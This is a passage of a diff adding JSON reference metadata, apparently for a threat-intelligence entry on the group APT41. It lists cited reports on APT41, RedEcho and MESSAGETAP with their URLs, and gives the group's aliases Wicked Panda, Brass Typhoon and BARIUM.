+      "description": "Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman & John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved September 16, 2024.",
+      "number": null,
+      "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments"
+    },
+    "Recorded Future RedEcho Feb 2021": {
+      "description": "Insikt Group. (2021, February 28). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved March 22, 2021.",
+      "number": null,
+      "url": "https://go.recordedfuture.com/hubfs/reports/cta-2021-0228.pdf"
+    },
+    "FireEye MESSAGETAP October 2019": {
+      "description": "Leong, R., Perez, D., Dean, T. (2019, October 31). MESSAGETAP: Who’s Reading Your Text Messages?. Retrieved May 11, 2020.",
+      "number": null,
+      "url": "https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html"
+    }
+  },
+  "aliases_list": [
+    "Wicked Panda",
+    "Brass Typhoon",
+    "BARIUM"
+  ]
+}
